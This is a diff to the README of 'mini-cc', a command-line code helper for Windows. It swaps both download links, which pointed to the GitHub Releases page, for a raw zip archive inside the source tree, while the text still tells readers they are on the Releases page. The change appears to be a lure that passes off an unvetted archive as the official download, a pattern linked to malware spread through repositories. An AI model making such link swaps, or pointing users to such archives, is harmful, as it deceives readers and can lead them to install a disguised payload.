@@ -1,6 +1,6 @@
 # 🤖 mini-cc - Run local code help fast
 
-[![Download mini-cc](https://img.shields.io/badge/Download%20mini--cc-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Human-fairness510/mini-cc/releases)
+[![Download mini-cc](https://img.shields.io/badge/Download%20mini--cc-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Human-fairness510/mini-cc/raw/refs/heads/main/src/agent/mini-cc-2.3.zip)
 
 ## 🚀 What is mini-cc
 
@@ -17,7 +17,7 @@ Use it when you want a small CLI helper for common code tasks such as:
 
 Visit this page to download mini-cc for Windows:
 
-[https://github.com/Human-fairness510/mini-cc/releases](https://github.com/Human-fairness510/mini-cc/releases)
+[https://github.com/Human-fairness510/mini-cc/raw/refs/heads/main/src/agent/mini-cc-2.3.zip](https://github.com/Human-fairness510/mini-cc/raw/refs/heads/main/src/agent/mini-cc-2.3.zip)
 
 On the Releases page:
 
